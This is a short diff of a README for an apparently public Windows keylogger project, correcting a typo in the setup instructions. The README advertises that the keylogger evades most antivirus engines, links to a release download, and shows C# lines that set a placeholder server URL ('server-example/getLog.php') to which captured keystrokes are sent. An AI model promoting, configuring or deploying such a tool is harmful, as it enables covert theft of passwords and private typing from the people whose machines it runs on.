@@ -14,7 +14,7 @@ This keylogger is undetected by 99% of the anti-virus on [**virustotal**](https:
 
 Download the [lastest release](https://github.com/Darkempire78/Windows-Keylogger/releases/) and install it.
 
-You can edit th lines 18-19 to add your server where send logs :
+You can edit the lines 18-19 to add your server where send logs :
 ```Csharp
 string serverLink = "http://server-example/getLog.php";
 string serverArg = "log";
